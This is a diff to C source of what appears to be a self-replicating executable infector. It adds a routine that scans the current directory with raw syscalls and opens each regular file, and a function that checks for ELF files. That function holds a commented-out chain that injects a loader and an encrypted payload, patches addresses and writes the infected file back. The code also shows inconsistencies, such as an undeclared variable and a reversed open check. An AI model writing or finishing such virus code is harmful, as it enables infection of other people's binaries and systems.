@@ -460,10 +460,99 @@ void	close_entries(void)
 	ft_memcpy(addr_hook, &addr_origin, 4);
 }
 
+int		check_own_file(char *path, t_fingerprint *fingerprint)
+{
+	struct stat		st;
+	t_info			info;
+	uint32_t		magic;
+	uint32_t		index = 0;
+	
+	if ((info.fd = ft_sysopen(path, O_RDWR)) > 0)
+		return (0);
+	if ((info.fd = ft_sysopen(path, O_RDONLY)) < 0)
+		return (0);
+	init_info(&info);
+	ft_sysfstat(info.fd, &st);
+	info.file_size = st.st_size;
+	if ((info.file_size > 60*1024*1024) || info.file_size < 0x2200)
+		goto end_close;
+	if ((info.file = ft_sysmmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, info.fd, 0)) == MAP_FAILED)
+		goto end_close;
+	if ((magic = *((uint32_t *)(info.file))) != 0x464C457F)
+		goto end_fct;
+// 	if ((*((uint32_t *)(info.file + 0x2205))) == 0x41414141)
+// 	{
+// 		fingerprint->index = 0x41414141;
+// 		index = fingerprint->index + fingerprint->fingerprint;
+// 		ft_memcpy(info.file + 0x2205, &index, 4);
+// 		goto rewrite_file;
+// 	}
+	// chopper l'adresse du index et celle du fingerprint, remplacer le fingerprint
+	
+
+// 	rewrite_file:
+// 	ft_syswrite(info.fd, info.file, info.file_size);
+// 	ft_sysmunmap(info.file, info.file_size);
+// 	ft_sysclose(info.fd);
+// 	return (1);
+// 
+// 	if (pe_parsing(&info) == 1)
+// 		goto end_fct;
+// 	if (reload_mapping(&info) == 1)
+// 		goto end_fct;
+// 	if (find_text(&info, fingerprint) == 1)
+// 		goto end_fct;
+// 	inject_loader(&info);
+// 	inject_payload(&info);
+// 	inject_bis(&info);
+// 	epo_parsing(&info);
+// 	if (info.valid_target == 0)
+// 		goto end_fct;
+// 	patch_addresses(&info);
+// 	inject_sign(&info, fingerprint);
+// 	patch_key(&info, encrypt(&info, info.file + info.offset_bis + BIS_SIZE, PAYLOAD_SIZE));
+// 	ft_syswrite(info.fd, info.file, info.file_size);
+	end_fct:
+	ft_sysmunmap(info.file, info.file_size);
+	end_close:
+	ft_sysclose(info.fd);
+	return (0);
+}
+
 void	update_own_index(t_fingerprint *fingerprint)
 {
+	char		pwd[PATH_MAX];
+	char					buf_d[1024];
+	struct linux_dirent64	*dir;
+	int						fd_dir, n_read, pos;
+	char					buf_path_file[PATH_MAX];
+
 	if (fingerprint->index < 0x41414141)
 		fingerprint->index = 0x41414141;
+	ft_sysgetcwd(pwd, PATH_MAX);
+	buf_path_file[0] = '/';
+	buf_path_file[1] = '\0';
+	ft_strcat(pwd, buf_path_file);
+	n_read = 0;
+	if ((fd_dir = ft_sysopen(pwd, O_RDONLY)) < 0)
+		return ;
+	while ((n_read = ft_sysgetdents(fd_dir, buf_d, 1024)) > 0)
+	{
+		for (pos = 0; pos < n_read;)
+		{
+			dir = (struct linux_dirent64 *)(buf_d + pos);
+			if (dir->d_type == 8) //dt_reg
+			{
+				ft_memcpy(buf_path_file, path, PATH_MAX);
+				ft_strcat(buf_path_file, dir->d_name);
+				if (check_own_file(buf_path_file, fingerprint) == 1)
+					goto end_fct;
+			}
+			pos += dir->d_reclen;
+		}
+	}
+	end_fct:
+	ft_sysclose(fd_dir);
 }
 
 int		main()
